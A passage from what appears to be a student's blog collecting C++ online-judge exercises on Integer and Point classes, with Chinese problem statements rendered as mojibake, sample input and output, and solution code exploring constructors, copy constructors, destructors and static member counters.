<p>\1. å…·æœ‰2ä¸ªæ„é€ å‡½æ•°ï¼š</p>
<p>ï¼ˆ1ï¼‰Integer::Integer(int)ï¼šæ ¹æ®å‚æ•°æ„å»ºä¸€ä¸ªæ•´æ•°å¯¹è±¡ã€‚</p>
<p>ï¼ˆ2ï¼‰Integer::Integer(char*, int)ï¼šæ ¹æ®ç»™å®šçš„å­—ç¬¦ä¸²å’Œè¿›åˆ¶æ¥æ„å»ºä¸€ä¸ªæ•´æ•°å¯¹è±¡ã€‚</p>
<p>\2. å…·æœ‰ä¸€ä¸ªint Integer::getValue()æ–¹æ³•ï¼Œç”¨äºè¿”å›Integerç±»ä¸­æ‰€å°è£…çš„æ•´æ•°çš„å…·ä½“æ•°å€¼ã€‚</p>
<h2 id="Input-9"><a href="#Input-9" class="headerlink" title="Input"></a>Input</h2><p>è¾“å…¥åˆ†ä¸ºå¤šè¡Œã€‚</p>
<p>ç¬¬ä¸€è¡Œæ˜¯ä¸€ä¸ªæ­£æ•´æ•°Mï¼Œè¡¨ç¤ºå…¶åé¢çš„Mè¡Œä¸ºMä¸ªæ•´æ•°ï¼Œæ¯è¡Œä¸€ä¸ªæ•´æ•°ã€‚</p>
<p>ç¬¬M+2è¡Œæ˜¯ä¸€ä¸ªæ­£æ•´æ•°Nï¼Œè¡¨ç¤ºå…¶åæœ‰Nè¡Œã€‚æ¯è¡Œç”±åˆ©ç”¨ä¸€ä¸ªç©ºæ ¼éš”å¼€çš„2éƒ¨åˆ†ç»„æˆï¼šå‰åŠéƒ¨åˆ†æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼ŒååŠéƒ¨åˆ†æ˜¯è¯¥å­—ç¬¦ä¸²æ‰€ä½¿ç”¨çš„è¿›åˆ¶ã€‚</p>
<p>æ³¨æ„ï¼š</p>
<p>\1. æ‰€æœ‰çš„è¾“å…¥ï¼Œå‡åœ¨intç±»å‹çš„è¡¨ç¤ºèŒƒå›´å†…ï¼Œä¸”æ‰€æœ‰çš„è¾“å…¥å‡ä¸ºåˆæ³•è¾“å…¥ã€‚</p>
<p>\2. åˆ©ç”¨0<del>9å’Œa</del>zå¯æœ€å¤§å¯ä»¥è¡¨ç¤º36è¿›åˆ¶çš„æ•°å€¼ã€‚</p>
<h2 id="Output-9"><a href="#Output-9" class="headerlink" title="Output"></a>Output</h2><p>è¾“å‡ºä¸ºM+Nè¡Œï¼Œæ¯è¡Œä¸ºä¸€ä¸ªåè¿›åˆ¶æ•´æ•°ï¼Œä¸”è¾“å‡ºé¡ºåºåº”ä¸è¾“å…¥é¡ºåºç›¸åŒã€‚</p>
<h2 id="Sample-Input-9"><a href="#Sample-Input-9" class="headerlink" title="Sample Input"></a>Sample Input</h2><p> 2999-199940111 21a 16z 36a 16</p>
<h2 id="Sample-Output-9"><a href="#Sample-Output-9" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>999-19997263510</p>
<h2 id="HINT-9"><a href="#HINT-9" class="headerlink" title="HINT"></a>HINT</h2><h2 id="Append-Code-9"><a href="#Append-Code-9" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="file:///D:/éƒä½³ä¼Ÿçš„æ–‡ä»¶/å­¦ä¹ èµ„æ–™/OJ-C++/å®éªŒ/1/Problem%20C_%20æ•´æ•°çš„å°è£…_files/Source%20Code.html">append.cc</a>, </p>
</blockquote>
<pre><code></code></pre>
<h3 id="11-å¹³é¢ä¸Šçš„ç‚¹â€”â€”Pointç±»-I"><a href="#11-å¹³é¢ä¸Šçš„ç‚¹â€”â€”Pointç±»-I" class="headerlink" title="11.å¹³é¢ä¸Šçš„ç‚¹â€”â€”Pointç±» (I)"></a>11.å¹³é¢ä¸Šçš„ç‚¹â€”â€”Pointç±» (I)</h3><blockquote>
<h2 id="Description-10"><a href="#Description-10" class="headerlink" title="Description"></a>Description</h2><p>åœ¨æ•°å­¦ä¸Šï¼Œå¹³é¢ç›´è§’åæ ‡ç³»ä¸Šçš„ç‚¹ç”¨Xè½´å’ŒYè½´ä¸Šçš„ä¸¤ä¸ªåæ ‡å€¼å”¯ä¸€ç¡®å®šã€‚ç°åœ¨æˆ‘ä»¬å°è£…ä¸€ä¸ªâ€œPointç±»â€æ¥å®ç°å¹³é¢ä¸Šçš„ç‚¹çš„æ“ä½œã€‚</p>
<p>æ ¹æ®â€œappend.ccâ€ï¼Œå®ŒæˆPointç±»çš„æ„é€ æ–¹æ³•å’Œshow()æ–¹æ³•ã€‚</p>
<p>æ¥å£æè¿°ï¼š<br> Point::show()æ–¹æ³•ï¼šæŒ‰è¾“å‡ºæ ¼å¼è¾“å‡ºPointå¯¹è±¡ã€‚</p>
<h2 id="Input-10"><a href="#Input-10" class="headerlink" title="Input"></a>Input</h2><p>è¾“å…¥å¤šè¡Œï¼Œæ¯è¡Œä¸ºä¸€ç»„åæ ‡â€œx,yâ€ï¼Œè¡¨ç¤ºç‚¹çš„xåæ ‡å’Œyåæ ‡ï¼Œxå’Œyçš„å€¼éƒ½åœ¨doubleæ•°æ®èŒƒå›´å†…ã€‚</p>
<h2 id="Output-10"><a href="#Output-10" class="headerlink" title="Output"></a>Output</h2><p>è¾“å‡ºä¸ºå¤šè¡Œï¼Œæ¯è¡Œä¸ºä¸€ä¸ªç‚¹ï¼ŒXåæ ‡åœ¨å‰ï¼ŒYåæ ‡åœ¨åï¼ŒYåæ ‡å‰é¢å¤šè¾“å‡ºä¸€ä¸ªç©ºæ ¼ã€‚æ¯ä¸ªåæ ‡çš„è¾“å‡ºç²¾åº¦ä¸ºæœ€é•¿16ä½ã€‚è¾“å‡ºæ ¼å¼è§sampleã€‚</p>
<p>Cè¯­è¨€çš„è¾“å…¥è¾“å‡ºè¢«ç¦ç”¨ã€‚</p>
<h2 id="Sample-Input-10"><a href="#Sample-Input-10" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>1,23,32,1</p>
<h2 id="Sample-Output-10"><a href="#Sample-Output-10" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>Point : (1, 2)Point : (3, 3)Point : (2, 1)Point : (0, 0)</p>
<h2 id="HINT-10"><a href="#HINT-10" class="headerlink" title="HINT"></a>HINT</h2><p>æ³¨æ„ç²¾åº¦æ§åˆ¶ï¼ŒCè¯­è¨€çš„è¾“å…¥è¾“å‡ºè¢«ç¦ç”¨ã€‚</p>
<h2 id="Append-Code-10"><a href="#Append-Code-10" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=1&pid=1121&getkey=">append.cc</a>, </p>
</blockquote>
<pre><code>#include &lt;iostream&gt;
using namespace std;
class Point&#123;
public:
    double x,y;
    Point():x(0),y(0)&#123;&#125;
    Point(double xx,double yy):x(xx),y(yy)&#123;&#125;
    void show()&#123;cout &lt;&lt; &quot;Point : (&quot; &lt;&lt; x &lt;&lt; &quot;, &quot; &lt;&lt; y &lt;&lt; &quot;)&quot; &lt;&lt; endl;&#125;
&#125;;
//////////////////////
int main()
&#123;
    char c;
    double a, b;
    Point q;
    while(std::cin&gt;&gt;a&gt;&gt;c&gt;&gt;b)
    &#123;
        Point p(a, b);
        p.show();
    &#125;
    q.show();
&#125;</code></pre>
<h3 id="12-å¹³é¢ä¸Šçš„ç‚¹â€”â€”Pointç±»-II"><a href="#12-å¹³é¢ä¸Šçš„ç‚¹â€”â€”Pointç±»-II" class="headerlink" title="12.å¹³é¢ä¸Šçš„ç‚¹â€”â€”Pointç±» (II)"></a>12.å¹³é¢ä¸Šçš„ç‚¹â€”â€”Pointç±» (II)</h3><blockquote>
<h2 id="Description-11"><a href="#Description-11" class="headerlink" title="Description"></a>Description</h2><p>åœ¨æ•°å­¦ä¸Šï¼Œå¹³é¢ç›´è§’åæ ‡ç³»ä¸Šçš„ç‚¹ç”¨Xè½´å’ŒYè½´ä¸Šçš„ä¸¤ä¸ªåæ ‡å€¼å”¯ä¸€ç¡®å®šã€‚ç°åœ¨æˆ‘ä»¬å°è£…ä¸€ä¸ªâ€œPointç±»â€æ¥å®ç°å¹³é¢ä¸Šçš„ç‚¹çš„æ“ä½œã€‚</p>
<p>æ ¹æ®â€œappend.ccâ€ï¼Œå®ŒæˆPointç±»çš„æ„é€ æ–¹æ³•å’Œshow()æ–¹æ³•ï¼Œè¾“å‡ºå„Pointå¯¹è±¡çš„æ„é€ å’Œææ„æ¬¡åºã€‚</p>
<p>æ¥å£æè¿°ï¼š<br> Point::show()æ–¹æ³•ï¼šæŒ‰è¾“å‡ºæ ¼å¼è¾“å‡ºPointå¯¹è±¡ã€‚</p>
<h2 id="Input-11"><a href="#Input-11" class="headerlink" title="Input"></a>Input</h2><p>è¾“å…¥å¤šè¡Œï¼Œæ¯è¡Œä¸ºä¸€ç»„åæ ‡â€œx,yâ€ï¼Œè¡¨ç¤ºç‚¹çš„xåæ ‡å’Œyåæ ‡ï¼Œxå’Œyçš„å€¼éƒ½åœ¨doubleæ•°æ®èŒƒå›´å†…ã€‚</p>
<h2 id="Output-11"><a href="#Output-11" class="headerlink" title="Output"></a>Output</h2><p>è¾“å‡ºæ¯ä¸ªPointå¯¹è±¡çš„æ„é€ å’Œææ„è¡Œä¸ºã€‚å¯¹æ¯ä¸ªPointå¯¹è±¡ï¼Œè°ƒç”¨show()æ–¹æ³•è¾“å‡ºå…¶å€¼ï¼šXåæ ‡åœ¨å‰ï¼ŒYåæ ‡åœ¨åï¼ŒYåæ ‡å‰é¢å¤šè¾“å‡ºä¸€ä¸ªç©ºæ ¼ã€‚æ¯ä¸ªåæ ‡çš„è¾“å‡ºç²¾åº¦ä¸ºæœ€é•¿16ä½ã€‚è¾“å‡ºæ ¼å¼è§sampleã€‚</p>
<p>Cè¯­è¨€çš„è¾“å…¥è¾“å‡ºè¢«ç¦ç”¨ã€‚</p>
<h2 id="Sample-Input-11"><a href="#Sample-Input-11" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>1,2</p>
<p>3,3</p>
<p>2,1</p>
<h2 id="Sample-Output-11"><a href="#Sample-Output-11" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>Point : (0, 0) is created.Point : (1, 2) is created.Point : (1, 2)Point : (1, 2) is erased.Point : (3, 3) is created.Point : (3, 3)Point : (3, 3) is erased.Point : (2, 1) is created.Point : (2, 1)Point : (2, 1) is erased.Point : (0, 0) is copied.Point : (1, 1) is created.Point : (0, 0)Point : (1, 1)Point : (0, 0)Point : (1, 1) is erased.Point : (0, 0) is erased.Point : (0, 0) is erased.</p>
<h2 id="HINT-11"><a href="#HINT-11" class="headerlink" title="HINT"></a>HINT</h2><p>æ€è€ƒæ„é€ å‡½æ•°ã€æ‹·è´æ„é€ å‡½æ•°ã€ææ„å‡½æ•°çš„è°ƒç”¨æ—¶æœºã€‚</p>
<h2 id="Append-Code-11"><a href="#Append-Code-11" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=1&pid=1122&getkey=">append.cc</a>, </p>
</blockquote>
<pre><code>#include &lt;iostream&gt;
using namespace std;
class Point&#123;
public:
    double x,y;
    Point():x(0),y(0)&#123;cout &lt;&lt; &quot;Point : (&quot; &lt;&lt; x &lt;&lt; &quot;, &quot; &lt;&lt; y &lt;&lt; &quot;) is created.&quot; &lt;&lt; endl;&#125;
    Point(double xx,double yy):x(xx),y(yy)&#123;cout &lt;&lt; &quot;Point : (&quot; &lt;&lt; x &lt;&lt; &quot;, &quot; &lt;&lt; y &lt;&lt; &quot;) is created.&quot; &lt;&lt; endl;&#125;
    Point(const Point&amp; p):x(p.x),y(p.y)&#123;cout &lt;&lt; &quot;Point : (0, 0) is copied.&quot; &lt;&lt; endl;&#125;
    Point(double xx):x(xx),y(xx)&#123;cout &lt;&lt; &quot;Point : (&quot; &lt;&lt; x &lt;&lt; &quot;, &quot; &lt;&lt; y &lt;&lt; &quot;) is created.&quot; &lt;&lt; endl;&#125;
    ~Point()&#123;cout &lt;&lt; &quot;Point : (&quot; &lt;&lt; x &lt;&lt; &quot;, &quot; &lt;&lt; y &lt;&lt; &quot;) is erased.&quot; &lt;&lt; endl;&#125;
    void show()&#123;cout &lt;&lt; &quot;Point : (&quot; &lt;&lt; x &lt;&lt; &quot;, &quot; &lt;&lt; y &lt;&lt; &quot;)&quot; &lt;&lt; endl;&#125;
&#125;;
//////////////////////////
int main()
&#123;
    char c;
    double a, b;
    Point q;
    while(std::cin&gt;&gt;a&gt;&gt;c&gt;&gt;b)
    &#123;
        Point p(a, b);
        p.show();
    &#125;
    Point q1(q), q2(1);
    q1.show();
    q2.show();
    q.show();
&#125;</code></pre>
<h3 id="13-å¹³é¢ä¸Šçš„ç‚¹â€”â€”Pointç±»-III"><a href="#13-å¹³é¢ä¸Šçš„ç‚¹â€”â€”Pointç±»-III" class="headerlink" title="13.å¹³é¢ä¸Šçš„ç‚¹â€”â€”Pointç±» (III)"></a>13.å¹³é¢ä¸Šçš„ç‚¹â€”â€”Pointç±» (III)</h3><blockquote>
<h2 id="Description-12"><a href="#Description-12" class="headerlink" title="Description"></a>Description</h2><p>åœ¨æ•°å­¦ä¸Šï¼Œå¹³é¢ç›´è§’åæ ‡ç³»ä¸Šçš„ç‚¹ç”¨Xè½´å’ŒYè½´ä¸Šçš„ä¸¤ä¸ªåæ ‡å€¼å”¯ä¸€ç¡®å®šã€‚ç°åœ¨æˆ‘ä»¬å°è£…ä¸€ä¸ªâ€œPointç±»â€æ¥å®ç°å¹³é¢ä¸Šçš„ç‚¹çš„æ“ä½œã€‚</p>
<p>æ ¹æ®â€œappend.ccâ€ï¼Œå®ŒæˆPointç±»çš„æ„é€ æ–¹æ³•å’Œshow()æ–¹æ³•ï¼Œè¾“å‡ºå„Pointå¯¹è±¡çš„æ„é€ å’Œææ„æ¬¡åºã€‚å®ç°showPoint()å‡½æ•°ã€‚</p>
<p>æ¥å£æè¿°ï¼š<br> showPoint()å‡½æ•°æŒ‰è¾“å‡ºæ ¼å¼è¾“å‡ºPointå¯¹è±¡ï¼Œè°ƒç”¨Point::show()æ–¹æ³•å®ç°ã€‚<br> Point::show()æ–¹æ³•ï¼šæŒ‰è¾“å‡ºæ ¼å¼è¾“å‡ºPointå¯¹è±¡ã€‚</p>
<h2 id="Input-12"><a href="#Input-12" class="headerlink" title="Input"></a>Input</h2><p>è¾“å…¥å¤šè¡Œï¼Œæ¯è¡Œä¸ºä¸€ç»„åæ ‡â€œx,yâ€ï¼Œè¡¨ç¤ºç‚¹çš„xåæ ‡å’Œyåæ ‡ï¼Œxå’Œyçš„å€¼éƒ½åœ¨doubleæ•°æ®èŒƒå›´å†…ã€‚</p>
<h2 id="Output-12"><a href="#Output-12" class="headerlink" title="Output"></a>Output</h2><p>è¾“å‡ºæ¯ä¸ªPointå¯¹è±¡çš„æ„é€ å’Œææ„è¡Œä¸ºã€‚showPoint()å‡½æ•°ç”¨æ¥è¾“å‡ºï¼ˆé€šè¿‡å‚æ•°ä¼ å…¥çš„ï¼‰Pointå¯¹è±¡çš„å€¼ï¼šXåæ ‡åœ¨å‰ï¼ŒYåæ ‡åœ¨åï¼ŒYåæ ‡å‰é¢å¤šè¾“å‡ºä¸€ä¸ªç©ºæ ¼ã€‚æ¯ä¸ªåæ ‡çš„è¾“å‡ºç²¾åº¦ä¸ºæœ€é•¿16ä½ã€‚è¾“å‡ºæ ¼å¼è§sampleã€‚</p>
<p>Cè¯­è¨€çš„è¾“å…¥è¾“å‡ºè¢«ç¦ç”¨ã€‚</p>
<h2 id="Sample-Input-12"><a href="#Sample-Input-12" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>1,2</p>
<p>3,3</p>
<p>2,1</p>
<h2 id="Sample-Output-12"><a href="#Sample-Output-12" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>Point : (0, 0) is created.</p>
<p>Point : (1, 2) is created.</p>
<p>Point : (1, 2) is copied.</p>
<p>Point : (1, 2)</p>
<p>Point : (1, 2) is erased.</p>
<p>Point : (1, 2) is erased.</p>
<p>Point : (3, 3) is created.</p>
<p>Point : (3, 3) is copied.</p>
<p>Point : (3, 3)</p>
<p>Point : (3, 3) is erased.</p>
<p>Point : (3, 3) is erased.</p>
<p>Point : (2, 1) is created.</p>
<p>Point : (2, 1) is copied.</p>
<p>Point : (2, 1)</p>
<p>Point : (2, 1) is erased.</p>
<p>Point : (2, 1) is erased.</p>
<p>Point : (0, 0) is copied.</p>
<p>Point : (1, 1) is created.</p>
<p>Point : (0, 0) is copied.</p>
<p>Point : (1, 1) is copied.</p>
<p>Point : (0, 0) is copied.</p>
<p>Point : (0, 0)</p>
<p>Point : (1, 1)</p>
<p>Point : (0, 0)</p>
<p>Point : (0, 0) is erased.</p>
<p>Point : (1, 1) is erased.</p>
<p>Point : (0, 0) is erased.</p>
<p>Point : (1, 1) is erased.</p>
<p>Point : (0, 0) is erased.</p>
<p>Point : (0, 0) is erased.</p>
<h2 id="HINT-12"><a href="#HINT-12" class="headerlink" title="HINT"></a>HINT</h2><p>æ€è€ƒæ„é€ å‡½æ•°ã€æ‹·è´æ„é€ å‡½æ•°ã€ææ„å‡½æ•°çš„è°ƒç”¨æ—¶æœºã€‚</p>
<h2 id="Append-Code-12"><a href="#Append-Code-12" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=1&pid=1123&getkey=">append.cc</a>, </p>
</blockquote>
<pre><code>#include &lt;iostream&gt;
using namespace std;
class Point&#123;
public:
    double x,y;
    Point():x(0),y(0)&#123;cout &lt;&lt; &quot;Point : (&quot; &lt;&lt; x &lt;&lt; &quot;, &quot; &lt;&lt; y &lt;&lt; &quot;) is created.&quot; &lt;&lt; endl;&#125;
    Point(double xx,double yy):x(xx),y(yy)&#123;cout &lt;&lt; &quot;Point : (&quot; &lt;&lt; x &lt;&lt; &quot;, &quot; &lt;&lt; y &lt;&lt; &quot;) is created.&quot; &lt;&lt; endl;&#125;
    Point(const Point&amp; p):x(p.x),y(p.y)&#123;cout &lt;&lt; &quot;Point : (0, 0) is copied.&quot; &lt;&lt; endl;&#125;
    Point(double xx):x(xx),y(xx)&#123;cout &lt;&lt; &quot;Point : (&quot; &lt;&lt; x &lt;&lt; &quot;, &quot; &lt;&lt; y &lt;&lt; &quot;) is created.&quot; &lt;&lt; endl;&#125;
    ~Point()&#123;cout &lt;&lt; &quot;Point : (&quot; &lt;&lt; x &lt;&lt; &quot;, &quot; &lt;&lt; y &lt;&lt; &quot;) is erased.&quot; &lt;&lt; endl;&#125;
    void show()&#123;cout &lt;&lt; &quot;Point : (&quot; &lt;&lt; x &lt;&lt; &quot;, &quot; &lt;&lt; y &lt;&lt; &quot;)&quot; &lt;&lt; endl;&#125;
&#125;;
void showPoint(Point s)&#123;s.show();&#125;
void showPoint(Point a,Point b,Point c)&#123;a.show();b.show();c.show();&#125;
////////////////////////////////
int main()
&#123;
    char c;
    double a, b;
    Point q;
    while(std::cin&gt;&gt;a&gt;&gt;c&gt;&gt;b)
    &#123;
        Point p(a, b);
        showPoint(p);
    &#125;
    Point q1(q), q2(1);
    showPoint(q1, q2, q);
&#125;</code></pre>
<h3 id="14-å¹³é¢ä¸Šçš„ç‚¹â€”â€”Pointç±»-IV"><a href="#14-å¹³é¢ä¸Šçš„ç‚¹â€”â€”Pointç±»-IV" class="headerlink" title="14.å¹³é¢ä¸Šçš„ç‚¹â€”â€”Pointç±» (IV)"></a>14.å¹³é¢ä¸Šçš„ç‚¹â€”â€”Pointç±» (IV)</h3><blockquote>
<h2 id="Description-13"><a href="#Description-13" class="headerlink" title="Description"></a>Description</h2><p>åœ¨æ•°å­¦ä¸Šï¼Œå¹³é¢ç›´è§’åæ ‡ç³»ä¸Šçš„ç‚¹ç”¨Xè½´å’ŒYè½´ä¸Šçš„ä¸¤ä¸ªåæ ‡å€¼å”¯ä¸€ç¡®å®šã€‚ç°åœ¨æˆ‘ä»¬å°è£…ä¸€ä¸ªâ€œPointç±»â€æ¥å®ç°å¹³é¢ä¸Šçš„ç‚¹çš„æ“ä½œã€‚<br> æ ¹æ®â€œappend.ccâ€ï¼Œå®ŒæˆPointç±»çš„æ„é€ æ–¹æ³•å’Œshow()ã€showCounter()ã€showSumOfPoint()æ–¹æ³•ï¼›å®ç°showPoint()å‡½æ•°ã€‚<br> æ¥å£æè¿°ï¼š<br> showPoint()å‡½æ•°ï¼šæŒ‰è¾“å‡ºæ ¼å¼è¾“å‡ºPointå¯¹è±¡ï¼Œè°ƒç”¨Point::show()æ–¹æ³•å®ç°ã€‚<br> Point::show()æ–¹æ³•ï¼šæŒ‰è¾“å‡ºæ ¼å¼è¾“å‡ºPointå¯¹è±¡ã€‚<br> Point::showCounter()æ–¹æ³•ï¼šæŒ‰æ ¼å¼è¾“å‡ºå½“å‰ç¨‹åºä¸­Pointå¯¹è±¡çš„è®¡æ•°ã€‚<br> Point::showSumOfPoint()æ–¹æ³•ï¼šæŒ‰æ ¼å¼è¾“å‡ºç¨‹åºè¿è¡Œè‡³å½“å‰å­˜åœ¨è¿‡çš„Pointå¯¹è±¡æ€»æ•°ã€‚</p>
<h2 id="Input-13"><a href="#Input-13" class="headerlink" title="Input"></a>Input</h2><p>è¾“å…¥å¤šè¡Œï¼Œæ¯è¡Œä¸ºä¸€ç»„åæ ‡â€œx,yâ€ï¼Œè¡¨ç¤ºç‚¹çš„xåæ ‡å’Œyåæ ‡ï¼Œxå’Œyçš„å€¼éƒ½åœ¨doubleæ•°æ®èŒƒå›´å†…ã€‚</p>
<h2 id="Output-13"><a href="#Output-13" class="headerlink" title="Output"></a>Output</h2><p>å¯¹æ¯ä¸ªPointå¯¹è±¡ï¼Œè°ƒç”¨show()æ–¹æ³•è¾“å‡ºå…¶å€¼ï¼Œæˆ–è€…ç”¨showPoint()å‡½æ•°æ¥è¾“å‡ºï¼ˆé€šè¿‡å‚æ•°ä¼ å…¥çš„ï¼‰Pointå¯¹è±¡çš„å€¼ï¼šXåæ ‡åœ¨å‰ï¼ŒYåæ ‡åœ¨åï¼ŒYåæ ‡å‰é¢å¤šè¾“å‡ºä¸€ä¸ªç©ºæ ¼ã€‚æ¯ä¸ªåæ ‡çš„è¾“å‡ºç²¾åº¦ä¸ºæœ€é•¿16ä½ã€‚è°ƒç”¨ç”¨showCounter()æ–¹æ³•å’ŒshowSumOfPoint()è¾“å‡ºPointå¯¹è±¡çš„è®¡æ•°ç»Ÿè®¡ï¼Œè¾“å‡ºæ ¼å¼è§sampleã€‚<br> Cè¯­è¨€çš„è¾“å…¥è¾“å‡ºè¢«ç¦ç”¨ã€‚</p>
<h2 id="Sample-Input-13"><a href="#Sample-Input-13" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>1,2</p>
<p>3,3</p>
<p>2,1</p>
<h2 id="Sample-Output-13"><a href="#Sample-Output-13" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>Point : (1, 2)</p>
<p>Current : 2 points.</p>
<p>Point : (3, 3)</p>
<p>Current : 2 points.</p>
<p>Point : (2, 1)</p>
<p>Current : 2 points.</p>
<p>In total : 4 points.</p>
<p>Current : 3 points.</p>
<p>Point : (0, 0)</p>
<p>Point : (1, 1)</p>
<p>Point : (0, 0)</p>
<p>In total : 6 points.</p>
<h2 id="HINT-13"><a href="#HINT-13" class="headerlink" title="HINT"></a>HINT</h2><p>å¯¹è±¡è®¡æ•°é€šè¿‡é™æ€æˆå‘˜æ¥å®ç°</p>
<h2 id="Append-Code-13"><a href="#Append-Code-13" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=1&pid=1124&getkey=">append.cc</a>, </p>
</blockquote>
<pre><code>#include &lt;iostream&gt;
using namespace std;
class Point&#123;  
private:  
    double x,y;  
    static int sum,num;  
public:  
    Point():x(0),y(0)&#123;num++;sum++;&#125;  
    Point(double a):x(a),y(1)&#123;num++;sum++;&#125;  
    Point(double a,double b):x(a),y(b)&#123;num++;sum++;&#125;  
    Point(const Point&amp;p)&#123;x=p.x;y=p.y;num++;sum++;&#125;  
    ~Point()&#123;num--;&#125;  
    void show()&#123;cout&lt;&lt;setprecision(16)&lt;&lt;&quot;Point : (&quot;&lt;&lt;x&lt;&lt;&quot;, &quot;&lt;&lt;y&lt;&lt;&quot;)&quot;&lt;&lt;endl;&#125;  
    static void showCounter()&#123;cout&lt;&lt;setprecision(16)&lt;&lt;&quot;Current : &quot;&lt;&lt;num&lt;&lt;&quot; points.&quot;&lt;&lt;endl;&#125;  
    static void showSumOfPoint()&#123;cout&lt;&lt;setprecision(16)&lt;&lt;&quot;In total : &quot;&lt;&lt;sum&lt;&lt;&quot; points.&quot;&lt;&lt;endl;&#125;  
&#125;;  
void showPoint(Point &amp;a,Point &amp;b,Point &amp;c)&#123;a.show();b.show();c.show();&#125;  
int Point::sum=0;  
int Point::num=0;  
////////////////////////////
int main()
&#123;
    char c;
    double a, b;
    Point q;
    while(std::cin&gt;&gt;a&gt;&gt;c&gt;&gt;b)
    &#123;
        Point p(a, b);
        p.show();
        p.showCounter();
    &#125;
    q.showSumOfPoint();
    Point q1(q), q2(1);
    Point::showCounter();
    showPoint(q1, q2, q);
    Point::showSumOfPoint();
&#125;</code></pre>
<h3 id="15-å¹³é¢ä¸Šçš„ç‚¹â€”â€”Pointç±»-V"><a href="#15-å¹³é¢ä¸Šçš„ç‚¹â€”â€”Pointç±»-V" class="headerlink" title="15.å¹³é¢ä¸Šçš„ç‚¹â€”â€”Pointç±» (V)"></a>15.å¹³é¢ä¸Šçš„ç‚¹â€”â€”Pointç±» (V)</h3><blockquote>
<h2 id="Description-14"><a href="#Description-14" class="headerlink" title="Description"></a>Description</h2><p>åœ¨æ•°å­¦ä¸Šï¼Œå¹³é¢ç›´è§’åæ ‡ç³»ä¸Šçš„ç‚¹ç”¨Xè½´å’ŒYè½´ä¸Šçš„ä¸¤ä¸ªåæ ‡å€¼å”¯ä¸€ç¡®å®šã€‚ç°åœ¨æˆ‘ä»¬å°è£…ä¸€ä¸ªâ€œPointç±»â€æ¥å®ç°å¹³é¢ä¸Šçš„ç‚¹çš„æ“ä½œã€‚<br> æ ¹æ®â€œappend.ccâ€ï¼Œå®ŒæˆPointç±»çš„æ„é€ æ–¹æ³•å’Œæ¥å£æè¿°ä¸­çš„æ–¹æ³•ã€‚<br> æ¥å£æè¿°ï¼š<br> showPoint()å‡½æ•°ï¼šæŒ‰è¾“å‡ºæ ¼å¼è¾“å‡ºPointå¯¹è±¡ã€‚<br> Point::show()æ–¹æ³•ï¼šæŒ‰è¾“å‡ºæ ¼å¼è¾“å‡ºPointå¯¹è±¡ã€‚<br> Point::showSumOfPoint()æ–¹æ³•ï¼šæŒ‰æ ¼å¼è¾“å‡ºç¨‹åºè¿è¡Œè‡³å½“å‰å­˜åœ¨è¿‡çš„Pointå¯¹è±¡æ€»æ•°ã€‚<br> Point::x()æ–¹æ³•ï¼šå–xåæ ‡ã€‚<br> Point::y()æ–¹æ³•ï¼šå–yåæ ‡ã€‚<br> Point::x(double)æ–¹æ³•ï¼šä¼ å‚æ•°è®¾ç½®xåæ ‡å¹¶è¿”å›ã€‚<br> Point::y(double)æ–¹æ³•ï¼šä¼ å‚æ•°è®¾ç½®yåæ ‡å¹¶è¿”å›ã€‚<br> Point::getX()æ–¹æ³•ï¼šå–xåæ ‡ã€‚<br> Point::getY()æ–¹æ³•ï¼šå–yåæ ‡ã€‚<br> Point::setX()æ–¹æ³•ï¼šä¼ å‚æ•°è®¾ç½®xåæ ‡å¹¶è¿”å›ã€‚<br> Point::setY()æ–¹æ³•ï¼šä¼ å‚æ•°è®¾ç½®yåæ ‡å¹¶è¿”å›ã€‚<br> Point::setPoint(double,double)æ–¹æ³•ï¼šè®¾ç½®Pointå¯¹è±¡çš„xåæ ‡ï¼ˆç¬¬ä¸€ä¸ªå‚æ•°ï¼‰å’Œyåæ ‡ï¼ˆç¬¬äºŒä¸ªå‚æ•°ï¼‰å¹¶è¿”å›æœ¬å¯¹è±¡</p>
<h2 id="Input-14"><a href="#Input-14" class="headerlink" title="Input"></a>Input</h2><p>è¾“å…¥å¤šè¡Œï¼Œæ¯è¡Œä¸ºä¸€ç»„åæ ‡â€œx,yâ€ï¼Œè¡¨ç¤ºç‚¹çš„xåæ ‡å’Œyåæ ‡ï¼Œxå’Œyçš„å€¼éƒ½åœ¨doubleæ•°æ®èŒƒå›´å†…ã€‚</p>
